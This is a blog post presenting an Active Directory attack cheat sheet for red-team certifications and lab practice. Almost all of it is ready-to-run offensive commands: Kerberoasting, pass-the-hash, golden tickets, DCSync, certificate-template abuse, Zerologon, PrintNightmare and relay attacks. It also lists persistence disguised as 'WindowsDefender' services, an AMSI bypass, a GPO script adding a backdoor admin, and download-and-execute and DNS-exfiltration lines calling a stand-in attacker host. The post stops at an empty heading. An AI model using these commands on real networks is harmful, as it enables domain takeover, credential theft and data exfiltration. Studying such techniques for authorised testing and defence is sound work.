---
layout: post
title: "🔥 Active Directory Attack Notes - Advanced Practical Reference"
date: 2025-06-28 09:34:53 +0000
categories: cybersecurity penetration-testing active-directory
tags: [activedirectory, pentesting, redteam, cybersecurity, hacking, kerberos, adcs, mimikatz, impacket, bloodhound]

---

## 🔥 Active Directory Attack Notes - Advanced Practical Reference

🎉 **Just completed the ultimate comprehensive Active Directory attack methodology guide!** This massive reference covers every attack vector, technique, and tool you need for advanced AD penetration testing and red team operations.

After extensive research, lab testing, and practical validation across HackTheBox, CRTP, CRTE, and CRTM environments, I've compiled this complete arsenal of 200+ commands, 50+ specialized tools, and cutting-edge attack chains for both Linux and Windows platforms.

---

## 🎯 Initial Access & Advanced Reconnaissance

### 🔍 Comprehensive Domain Enumeration

#### Linux Tools:

```bash
# LDAP Deep Enumeration
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" -s sub "(objectClass=*)" | grep -i "member\|admin\|service"
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" # DONT_REQUIRE_PREAUTH
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" # TRUSTED_FOR_DELEGATION
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" "(servicePrincipalName=*)" # All SPNs

# Impacket Advanced Recon
GetADUsers.py -dc-ip DC_IP domain.com/username:password -all
GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request-user TARGET_USER
GetNPUsers.py -dc-ip DC_IP domain.com/ -usersfile users.txt -format hashcat
lookupsid.py domain.com/username:password@DC_IP # Get domain SID
GetADComputers.py -dc-ip DC_IP domain.com/username:password

# Advanced enum4linux
enum4linux -a -M -l -d DC_IP
enum4linux -a -u "" -p "" DC_IP

# rpcclient Advanced
rpcclient -U "" -N DC_IP
> enumdomusers | grep -v "user:" | cut -d[ -f2 | cut -d] -f1 > users.txt
> enumdomgroups
> queryusergroups 0x1f4 # Admin RID
> querygroupmem 0x200 # Domain Admins
> enumprivs
> srvinfo

# DNS Enumeration
dig @DC_IP _ldap._tcp.domain.com SRV
dig @DC_IP _kerberos._tcp.domain.com SRV
dig @DC_IP _ldap._tcp.dc._msdcs.domain.com SRV
dnsrecon -d domain.com -n DC_IP -a
dnsenum --dnsserver DC_IP domain.com

# SMB Enumeration
smbclient -L //DC_IP -N
smbmap -H DC_IP -u guest
smbmap -H DC_IP -u "" -p ""
```

#### Windows Advanced Tools:

```powershell
# PowerView Advanced
Import-Module PowerView.ps1
Get-Domain -Domain domain.com
Get-DomainController
Get-DomainUser -AdminCount | select name,samaccountname,admincount,description
Get-DomainComputer -TrustedForAuth | select name,trustedfordelegation,trustedforauth
Get-DomainGroup -AdminCount | select name,admincount,description
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGPO | select displayname,gpcpath
Get-DomainGPOLocalGroup | select GPODisplayName,GroupName
Get-DomainOU | select name,distinguishedname
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-DomainProcess -UserGroupIdentity "Domain Admins"
Get-DomainTrust
Get-ForestTrust
Get-DomainForeignUser
Get-DomainForeignGroupMember
Invoke-UserHunter -CheckAccess
Invoke-ProcessHunter

# BloodHound Advanced
.\SharpHound.exe -c All --stealth --zipfilename bh_$(Get-Date -Format yyyy-MM-dd_HH-mm).zip
.\SharpHound.exe -c DCOnly --stealth
.\SharpHound.exe -c Session,ComputerOnly,Trusts

# ADRecon
.\ADRecon.ps1 -DomainController DC_IP -Credential $cred

# Native Windows Advanced
net user /domain | findstr /i admin
net group /domain | findstr /i admin
net localgroup administrators /domain
nltest /domain_trusts /all_trusts
nltest /dsgetdc:domain.com
wmic useraccount where "LocalAccount=False" get Name,SID
wmic group where "LocalAccount=False" get Name,SID

# LDAP Queries (PowerShell)
([adsisearcher]"(&(objectClass=user)(adminCount=1))").FindAll()
([adsisearcher]"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()
([adsisearcher]"(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()
```

### 🌐 Network & Service Discovery

#### Linux:

```bash
# Nmap AD Specific
nmap -p88,135,139,389,445,464,593,636,3268,3269,5985,9389 DC_IP
nmap --script smb-protocols,smb-security-mode,smb-enum-shares DC_IP
nmap --script ldap-rootdse,ldap-search DC_IP -p389,636

# Kerbrute
kerbrute userenum -d domain.com users.txt --dc DC_IP
kerbrute passwordspray -d domain.com users.txt 'Password123!' --dc DC_IP

# CrackMapExec Discovery
crackmapexec smb SUBNET/24
crackmapexec ldap DC_IP -u '' -p '' --users
crackmapexec ldap DC_IP -u '' -p '' --groups
crackmapexec winrm SUBNET/24
```

#### Windows:

```powershell
# Port Scanning
Test-NetConnection -ComputerName DC_IP -Port 88,135,139,389,445,464,593,636,3268,3269,5985,9389

# Service Discovery
Get-Service -ComputerName DC_IP | Where-Object {$_.Status -eq "Running"}
Get-WmiObject -Class Win32_Service -ComputerName DC_IP | Where-Object {$_.State -eq "Running"}
```

---

## 🔓 Credential Attacks

### 1. Kerberoasting

#### Linux:

```bash
# Impacket
GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request
GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request -outputfile kerberoast_hashes.txt

# Crack with hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Windows:

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:serviceaccount /outfile:hashes.txt

# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Request-SPNTicket -SPN "HTTP/web.domain.com"
```

### 2. ASREPRoasting

#### Linux:

```bash
# Impacket
GetNPUsers.py -dc-ip DC_IP domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
GetNPUsers.py -dc-ip DC_IP domain.com/username:password -request

# Crack with hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Windows:

```powershell
# Rubeus
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt
.\Rubeus.exe asreproast /user:username /outfile:asrep_hashes.txt
```

### 3. Password Spraying

#### Linux:

```bash
# CrackMapExec
crackmapexec smb DC_IP -u users.txt -p passwords.txt
crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.com users.txt 'Password123!'
```

#### Windows:

```powershell
# DomainPasswordSpray
Invoke-DomainPasswordSpray -Password Password123!
Invoke-DomainPasswordSpray -UserList users.txt -Password Password123!
```

---

## 🎭 Pass Attacks

### 1. Pass-the-Hash

#### Linux:

```bash
# CrackMapExec
crackmapexec smb TARGET_IP -u username -H NTLM_HASH
crackmapexec smb TARGET_IP -u username -H NTLM_HASH -x "whoami"

# Impacket
psexec.py -hashes :NTLM_HASH username@TARGET_IP
wmiexec.py -hashes :NTLM_HASH username@TARGET_IP
smbexec.py -hashes :NTLM_HASH username@TARGET_IP
```

#### Windows:

```powershell
# Mimikatz
sekurlsa::pth /user:username /domain:domain.com /ntlm:NTLM_HASH

# Invoke-TheHash
Invoke-SMBExec -Target TARGET_IP -Username username -Hash NTLM_HASH -Command "whoami"
```

### 2. Pass-the-Ticket

#### Linux:

```bash
# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com username
export KRB5CCNAME=username.ccache
psexec.py domain.com/username@TARGET_IP -k -no-pass
```

#### Windows:

```powershell
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 👑 Privilege Escalation

### 1. Golden Ticket

#### Linux:

```bash
# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py domain.com/Administrator@DC_IP -k -no-pass
```

#### Windows:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
```

### 2. Silver Ticket

#### Linux:

```bash
# Impacket
ticketer.py -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain domain.com -spn SERVICE/TARGET Administrator
export KRB5CCNAME=Administrator.ccache
```

#### Windows:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /target:TARGET /service:SERVICE /rc4:SERVICE_HASH /ptt
```

### 3. DCSync

#### Linux:

```bash
# Impacket
secretsdump.py domain.com/username:password@DC_IP
secretsdump.py -hashes :NTLM_HASH domain.com/username@DC_IP
```

#### Windows:

```powershell
# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /user:Administrator
```

---

## 🌐 Lateral Movement

### 1. NTLM Relay

#### Linux:

```bash
# Responder + ntlmrelayx
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support

# With specific target
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "powershell -enc <base64_payload>"
```

### 2. Remote Execution

#### Linux:

```bash
# Impacket
psexec.py domain.com/username:password@TARGET_IP
wmiexec.py domain.com/username:password@TARGET_IP
smbexec.py domain.com/username:password@TARGET_IP
dcomexec.py domain.com/username:password@TARGET_IP

# With hashes
psexec.py -hashes :NTLM_HASH domain.com/username@TARGET_IP
```

#### Windows:

```powershell
# PsExec
PsExec.exe \\TARGET_IP -u domain\username -p password cmd

# WMI
wmic /node:TARGET_IP /user:domain\username /password:password process call create "cmd.exe"

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET_IP -Credential domain\username
Invoke-Command -ComputerName TARGET_IP -Credential domain\username -ScriptBlock {whoami}
```

---

## 🔍 Advanced Techniques

### 1. Constrained Delegation

#### Linux:

```bash
# Find delegation
GetUserSPNs.py -dc-ip DC_IP domain.com/username:password -request-user TARGET_USER

# Exploit
getST.py -spn SERVICE/TARGET -impersonate Administrator domain.com/SERVICE_ACCOUNT:password
export KRB5CCNAME=Administrator.ccache
```

#### Windows:

```powershell
# Rubeus
.\Rubeus.exe s4u /user:SERVICE_ACCOUNT /rc4:HASH /impersonateuser:Administrator /msdsspn:SERVICE/TARGET /ptt
```

### 2. Unconstrained Delegation

#### Linux:

```bash
# Monitor for tickets
python printerbug.py domain.com/username:password@TARGET_IP DC_IP
# Extract TGT from memory
```

#### Windows:

```powershell
# PowerView
Get-DomainComputer -Unconstrained

# Mimikatz
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```

### 3. Resource-Based Constrained Delegation (RBCD)

#### Linux:

```bash
# Add computer account
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Password123!' domain.com/username:password -dc-ip DC_IP

# Set delegation
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write domain.com/username:password -dc-ip DC_IP

# Get ticket
getST.py -spn 'cifs/TARGET.domain.com' -impersonate Administrator domain.com/'FAKE$':'Password123!' -dc-ip DC_IP
```

#### Windows:

```powershell
# PowerMad + PowerView
New-MachineAccount -MachineAccount FAKE -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
Set-DomainRBCD -Identity TARGET$ -DelegateFrom FAKE$

# Rubeus
.\Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /ptt
```

---

## 🔐 Persistence

### 1. DCShadow

#### Windows:

```powershell
# Mimikatz
lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=domain,DC=com /attribute:userAccountControl /value:512
lsadump::dcshadow /push
```

### 2. Skeleton Key

#### Windows:

```powershell
# Mimikatz
misc::skeleton
# Password becomes "mimikatz"
```

### 3. AdminSDHolder

#### Windows:

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity username -Rights All
```

---

## 🛠️ Advanced Certificate Attacks (ADCS)

### 🔍 Certificate Enumeration

#### Linux:

```bash
# Certipy Complete Enumeration
certipy find -u username@domain.com -p password -dc-ip DC_IP -stdout
certipy find -u username@domain.com -p password -dc-ip DC_IP -vulnerable -enabled
certipy ca -u username@domain.com -p password -dc-ip DC_IP -ca CA_NAME
```

#### Windows:

```powershell
# Certify Complete Enumeration
.\Certify.exe find /vulnerable /currentuser
.\Certify.exe find /vulnerable /machineidentity
.\Certify.exe cas
.\Certify.exe pkiobjects
```

### 🎯 ESC1-8 Attack Scenarios

#### ESC1 - Vulnerable Certificate Templates

```bash
# Linux - Certipy
certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template VulnTemplate -alt Administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Windows - Certify
.\Certify.exe request /ca:CA_SERVER\CA_NAME /template:VulnTemplate /altname:Administrator
```

#### ESC2 - Any Purpose EKU

```bash
# Request certificate with Any Purpose EKU
certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template AnyPurpose -alt Administrator@domain.com
```

#### ESC3 - Certificate Request Agent

```bash
# Use Certificate Request Agent to request on behalf of others
certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template RequestAgent
certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template User -on-behalf-of domain\\Administrator -pfx lowpriv.pfx
```

#### ESC4 - Vulnerable Certificate Template Access Control

```bash
# Modify vulnerable template
certipy template -u lowpriv@domain.com -p password -template VulnTemplate -save-old
certipy template -u lowpriv@domain.com -p password -template VulnTemplate -configuration SubjectAltRequireUPN=False -configuration SubjectAltRequireDNS=False
```

#### ESC5 - Vulnerable PKI Object Access Control

```bash
# Exploit vulnerable CA permissions
certipy ca -u lowpriv@domain.com -p password -dc-ip DC_IP -ca CA_NAME -add-officer lowpriv
```

#### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

```bash
# Exploit misconfigured CA flag
certipy req -u lowpriv@domain.com -p password -target CA_SERVER -template User -alt Administrator@domain.com
```

#### ESC7 - Vulnerable Certificate Authority Access Control

```bash
# Exploit CA admin permissions
certipy ca -u lowpriv@domain.com -p password -dc-ip DC_IP -ca CA_NAME -enable-template VulnTemplate
```

#### ESC8 - NTLM Relay to AD CS HTTP Endpoints

```bash
# NTLM Relay to Certificate Authority
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### 🔐 Advanced Certificate Attacks

#### Shadow Credentials

```bash
# Linux - pyWhisker
python3 pyWhisker.py -d domain.com -u lowpriv -p password -t TARGET_USER --action add
python3 pyWhisker.py -d domain.com -u lowpriv -p password -t TARGET_USER --action list

# Windows - Whisker
.\Whisker.exe add /target:TARGET_USER
.\Whisker.exe list /target:TARGET_USER
```

#### UnPAC the Hash

```bash
# Use certificate to get TGT and extract NTLM hash
certipy auth -pfx user.pfx -dc-ip DC_IP
python3 gettgtpkinit.py domain.com/user -cert-pfx user.pfx -pfx-pass password
python3 getnthash.py domain.com/user -key TGT_KEY
```

---

## 📋 Quick Commands Cheat Sheet

### Domain Info

```bash
# Get domain SID
lookupsid.py domain.com/username:password@DC_IP

# Get domain functional level
Get-ADDomain | select DomainMode
```

### Password Policies

```bash
# Linux
enum4linux -P DC_IP

# Windows
net accounts /domain
```

### Trust Relationships

```bash
# Linux
nltest /domain_trusts

# Windows
Get-DomainTrust
```

### GPO Enumeration

```powershell
# PowerView
Get-DomainGPO
Get-DomainGPOLocalGroup
```

---

## 💥 Advanced Exploitation Techniques

### 🖨️ PrintNightmare (CVE-2021-1675/34527)

#### Linux:

```bash
# Impacket
rpcdump.py @DC_IP | grep -i spooler
python3 CVE-2021-1675.py domain.com/lowpriv:password@DC_IP '\\attacker_ip\share\evil.dll'

# CubeO1d Implementation
python3 CVE-2021-1675.py domain.com/user:pass@target '\\\attacker\share\rev.dll'
```

#### Windows:

```powershell
# PowerShell Implementation
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName "PrintMe" -NewUser "adm1n" -NewPassword "P@ssw0rd123"

# C# Implementation
.\SharpPrintNightmare.exe C:\Windows\System32\kernelbase.dll \\attacker\share\evil.dll
```

### ⚡ Zerologon (CVE-2020-1472)

#### Linux:

```bash
# Test for vulnerability
python3 zerologon_tester.py DC_NAME DC_IP

# Exploit
python3 cve-2020-1472-exploit.py DC_NAME DC_IP
secretsdump.py -just-dc -no-pass DC_NAME\$@DC_IP

# Restore machine account
python3 restorepassword.py domain.com/DC_NAME@DC_NAME -target-ip DC_IP -hexpass ORIGINAL_HEX_PASSWORD
```

#### Windows:

```powershell
# SharpZeroLogon
.\SharpZeroLogon.exe DC_NAME DC_IP
```

### 🔗 Coercion Attacks

#### PetitPotam

```bash
# Linux
python3 PetitPotam.py attacker_ip DC_IP
python3 PetitPotam.py -u lowpriv -p password attacker_ip DC_IP

# Windows
.\PetitPotam.exe attacker_ip DC_IP
```

#### Coercer (Multiple Methods)

```bash
# Comprehensive coercion scanning
python3 Coercer.py -t DC_IP -l attacker_ip --scan
python3 Coercer.py -t DC_IP -l attacker_ip -m MS-RPRN
python3 Coercer.py -t DC_IP -l attacker_ip -m MS-EFSRPC
python3 Coercer.py -t DC_IP -l attacker_ip -m MS-DFSNM
```

#### PrinterBug

```bash
# SpoolSample
python3 printerbug.py domain.com/lowpriv:password@DC_IP attacker_ip

# Windows
.\SpoolSample.exe DC_IP attacker_ip
```

### 🏛️ Advanced ACL Abuse

#### Linux:

```bash
# dacledit.py (Impacket)
dacledit.py -action read -target Administrator domain.com/lowpriv:password -dc-ip DC_IP
dacledit.py -action write -target Administrator -principal lowpriv -rights FullControl domain.com/lowpriv:password -dc-ip DC_IP

# owneredit.py
owneredit.py -action read -target Administrator domain.com/lowpriv:password -dc-ip DC_IP
owneredit.py -action write -target Administrator -new-owner lowpriv domain.com/lowpriv:password -dc-ip DC_IP
```

#### Windows:

```powershell
# PowerView Advanced ACL
Get-ObjectAcl -SamAccountName Administrator -ResolveGUIDs | Where-Object {$_.IdentityReference -eq "DOMAIN\lowpriv"}
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName lowpriv -Rights All

# Set-ADACL
Set-ADACL -SamAccountName Administrator -Right GenericAll -Principal lowpriv
```

### 📋 Advanced GPO Attacks

#### GPO Enumeration & Abuse

```bash
# Linux - impacket
GetGPPPassword.py -xmlfile Groups.xml
findDelegation.py domain.com/lowpriv:password -dc-ip DC_IP

# Windows - PowerView
Get-DomainGPO -ComputerIdentity TARGET_COMPUTER | select displayname,gpcpath
Get-DomainGPOLocalGroup | Where-Object {$_.GroupName -like "*admin*"}
Get-DomainGPOComputerLocalGroupMapping | Where-Object {$_.ComputerName -eq "TARGET"}

# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"
```

### 💊 LAPS Bypass & Abuse

#### Linux:

```bash
# LAPSDumper
python3 laps.py -u lowpriv -p password -d domain.com -dc-ip DC_IP
python3 laps.py -u lowpriv -p password -d domain.com -dc-ip DC_IP -l

# CrackMapExec LAPS
crackmapexec ldap DC_IP -u lowpriv -p password --laps
```

#### Windows:

```powershell
# PowerView LAPS
Get-DomainComputer | Where-Object {$_."ms-mcs-admpwdexpirationtime" -ne $null} | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# LAPSToolkit
Get-LAPSComputers
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
```

### 🔄 Advanced Trust Attacks

#### Cross-Domain Attacks

```bash
# Linux - Get foreign domain info
GetADUsers.py -all -dc-ip FOREIGN_DC_IP foreign.domain.com/user:password
GetUserSPNs.py -dc-ip FOREIGN_DC_IP foreign.domain.com/user:password -request

# Trust key extraction
secretsdump.py domain.com/Administrator@DC_IP -just-dc-user "krbtgt" -just-dc-ntlm
```

#### Windows - Cross-Domain

```powershell
# PowerView Cross-Domain
Get-DomainTrust -Domain domain.com
Get-DomainUser -Domain foreign.domain.com
Get-DomainForeignUser -Domain foreign.domain.com
Get-DomainForeignGroupMember -Domain foreign.domain.com

# Mimikatz Trust Attack
kerberos::golden /user:Administrator /domain:child.domain.com /sid:S-1-5-21-xxx-xxx-xxx /sids:S-1-5-21-yyy-yyy-yyy-519 /krbtgt:HASH /ticket:trust.kirbi
```

### 📧 Exchange Attacks

#### ProxyLogon/ProxyShell

```bash
# ProxyLogon
python3 proxylogon.py exchange.domain.com Administrator password

# ProxyShell
python3 proxyshell.py -t https://exchange.domain.com -u lowpriv@domain.com -p password -c "whoami"
```

#### PrivExchange

```bash
# PrivExchange
python3 privexchange.py -u lowpriv -p password -ah attacker_ip exchange.domain.com
ntlmrelayx.py -t ldap://DC_IP --escalate-user lowpriv
```

### 🖥️ SCCM Attacks

#### SCCM Enumeration

```bash
# SCCMHunter
python3 sccmhunter.py find -dc-ip DC_IP -u lowpriv -p password

# Windows
Get-WmiObject -Class SMS_Site -Namespace root\sms -ComputerName SCCM_SERVER
```

#### SCCM Exploitation

```bash
# SharpSCCM
.\SharpSCCM.exe get class-instances SMS_Admin
.\SharpSCCM.exe invoke class-method SMS_Collection RequestRefresh
```

---

## 🎪 Advanced Attack Chains

### 🔗 Chain 1: Coercion → NTLM Relay → ADCS → Golden Ticket

1. **Coercer.py** → Force authentication from DC
2. **ntlmrelayx.py** → Relay to ADCS HTTP endpoint
3. **certipy auth** → Authenticate with certificate
4. **secretsdump.py** → DCSync krbtgt hash
5. **ticketer.py** → Create golden ticket

### 🔗 Chain 2: ASREPRoasting → Shadow Credentials → DA

1. **GetNPUsers.py** → Find ASREProastable users
2. **hashcat** → Crack user password
3. **pyWhisker.py** → Add shadow credentials to DA
4. **certipy auth** → Authenticate as DA with certificate
5. **secretsdump.py** → Extract all domain hashes

### 🔗 Chain 3: PrintNightmare → Local Admin → LAPS → Domain Escalation

1. **CVE-2021-1675.py** → Exploit PrintNightmare for local admin
2. **secretsdump.py** → Extract local SAM
3. **crackmapexec** → Password spray with local admin hash
4. **LAPS read permissions** → Extract LAPS passwords
5. **High-privilege server** → DCSync attack

### 🔗 Chain 4: Certificate Template Abuse → Cross-Domain Attack

1. **certipy find** → Identify vulnerable templates
2. **certipy req** → Request certificate as foreign principal
3. **certipy auth** → Authenticate in foreign domain
4. **Cross-domain trust exploitation**
5. **Forest-wide compromise**

### 🔗 Chain 5: Exchange → RBCD → Golden Ticket

1. **PrivExchange.py** → Coerce Exchange authentication
2. **ntlmrelayx.py** → Relay to LDAP with --escalate-user
3. **addcomputer.py** → Add attacker-controlled machine
4. **rbcd.py** → Configure RBCD on domain controller
5. **getST.py** → Impersonate Administrator
6. **secretsdump.py** → DCSync krbtgt hash

### 🔗 Chain 6: Zerologon → ADCS → Persistence

1. **zerologon_tester.py** → Test for Zerologon vulnerability
2. **cve-2020-1472-exploit.py** → Reset DC machine account
3. **secretsdump.py** → Extract all domain secrets
4. **certipy ca** → Abuse ADCS for persistence
5. **restorepassword.py** → Restore DC machine account (stealth)

---

## 🔮 Advanced Persistence & Evasion

### 🎭 Advanced Persistence Methods

#### WMI Event Subscriptions

```powershell
# Create WMI persistence
$Query = "SELECT * FROM Win32_Process WHERE Name='notepad.exe'"
$Action = "powershell.exe -enc <base64_payload>"
Register-WmiEvent -Query $Query -Action { Start-Process $Action }

# Cleanup
Get-WmiObject -Class __EventFilter -Namespace root\subscription | Remove-WmiObject
```

#### Scheduled Tasks Persistence

```bash
# Linux - Impacket
atexec.py domain.com/user:pass@target 'schtasks /create /tn "UpdateTask" /tr "powershell -enc <payload>" /sc daily'

# Windows
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -c <payload>" /sc onlogon /ru system
```

#### Service Persistence

```bash
# Create malicious service
sc create "WindowsDefender" binpath= "cmd.exe /c powershell -enc <payload>" start= auto
sc start "WindowsDefender"
```

#### Registry Persistence

```powershell
# Multiple registry persistence methods
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender" -Value "powershell -enc <payload>"
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -enc <payload>"
```

### 👻 Evasion Techniques

#### PowerShell Evasion

```powershell
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution Policy Bypass
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
powershell -w hidden -ep bypass -enc <base64_payload>

# Obfuscation
Invoke-Obfuscation
```

#### Process Injection

```powershell
# Reflective DLL Injection
Invoke-ReflectivePEInjection -PEUrl http://attacker/payload.dll -ProcName explorer

# Process Hollowing
Start-Process notepad.exe -WindowStyle Hidden
Invoke-ProcessHollowing -Processname notepad.exe -PayloadURL http://attacker/payload.exe
```

#### Living Off The Land

```bash
# LOLBAS techniques
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
mshta http://attacker/payload.hta
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/payload.sct")
```

### 🕷️ Advanced Lateral Movement

#### WMI Lateral Movement

```bash
# Linux - impacket
wmiexec.py domain.com/user:pass@target
wmiexec.py -hashes :NTLM_HASH domain.com/user@target

# Windows
wmic /node:target /user:domain\user /password:pass process call create "cmd.exe /c <command>"
Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>"
```

#### DCOM Lateral Movement

```bash
# Linux
dcomexec.py domain.com/user:pass@target
dcomexec.py -hashes :NTLM_HASH domain.com/user@target

# Windows
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c <command>", "7")
```

#### WinRM Lateral Movement

```bash
# Linux
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTLM_HASH

# Windows
Enter-PSSession -ComputerName target -Credential $cred
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock {<command>}
```

### 🌐 DNS Attacks

#### DNS Exfiltration

```bash
# DNSExfiltrator
python3 dnsexfiltrator.py -d domain.com -f /etc/passwd

# Windows
nslookup $(echo "data" | base64).attacker.com
```

#### DNS Poisoning

```bash
# Responder DNS spoofing
responder -I eth0 -A

# DNSChef
dnschef --fakeip=attacker_ip --fakedomains=*.domain.com
```

---

## 🔧 Essential Tool Installation & Setup

### 🐧 Advanced Linux Setup

```bash
# Core Tools
pip3 install impacket crackmapexec ldap3 dnspython requests
go install github.com/ropnop/kerbrute@latest
pip3 install certipy-ad bloodhound neo4j-driver

# Advanced Tools
git clone https://github.com/fortra/impacket.git && cd impacket && pip3 install .
git clone https://github.com/dirkjanm/krbrelayx.git
git clone https://github.com/SecureAuthCorp/impacket.git
pip3 install lsassy netexec
apt install enum4linux smbclient ldap-utils dnsutils

# Specialized Tools
git clone https://github.com/ly4k/Certipy.git
git clone https://github.com/p0dalirius/Coercer.git
git clone https://github.com/eladshamir/Whisker.git
git clone https://github.com/ShutdownRepo/pywhisker.git
git clone https://github.com/dirkjanm/mitm6.git
pip3 install mitm6

# Post-Exploitation
git clone https://github.com/SecureAuthCorp/impacket.git
pip3 install pycryptodome pyasn1 ldap3
```

### 🪟 Advanced Windows Setup

```powershell
# PowerShell Modules
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')

# C# Tools (Download and compile or use pre-compiled)
# SharpHound, Rubeus, Seatbelt, SharpUp, Certify, Whisker
# SharpGPOAbuse, SharpSCCM, SharpPrintNightmare, SharpZeroLogon

# Advanced PowerShell Tools
Import-Module ActiveDirectory
Import-Module GroupPolicy
Install-Module ADRecon
```

### 🐳 Docker Environments

```bash
# BloodHound
docker run -p 7474:7474 -p 7687:7687 neo4j:latest

# Impacket
docker pull securitynik/impacket

# Complete AD Lab
docker-compose up -d goad # Game of Active Directory
```

---

## 🎯 Advanced Methodology & Tips

### 🔍 Systematic Enumeration Approach

1. **Network Discovery**: nmap, crackmapexec smb, port scanning
2. **Domain Enumeration**: BloodHound, PowerView, LDAP queries
3. **Credential Hunting**: Kerberoasting, ASREPRoasting, password spraying
4. **Certificate Analysis**: certipy find, template enumeration
5. **Trust Relationships**: Domain trusts, forest trusts, external trusts
6. **Service Analysis**: Exchange, SCCM, SQL servers, web applications
7. **Misconfigurations**: Unconstrained delegation, dangerous permissions

### 🏆 Certification-Specific Strategies

#### 🎯 CRTP (Certified Red Team Professional)

- Focus on PowerShell and .NET techniques
- Master BloodHound for attack path discovery
- Practice constrained delegation exploitation
- Understand forest-level attacks and cross-domain scenarios
- SQL server links are common privilege escalation vectors

#### 🎯 CRTE (Certified Red Team Expert)

- Advanced persistence techniques (WMI, scheduled tasks)
- Certificate template abuse and ADCS attacks
- Cross-forest attacks and enterprise admin escalation
- Advanced evasion techniques and AMSI bypasses
- Complex multi-hop scenarios with various trust types

#### 🎯 CRTM (Certified Red Team Master)

- Zero-day research and exploit development
- Advanced coercion and relay attack chains
- Complex enterprise environments with multiple forests
- Custom tooling development and automation
- Advanced threat hunting evasion

### 🎪 HackTheBox Pro Tips

#### 🔥 Common Patterns

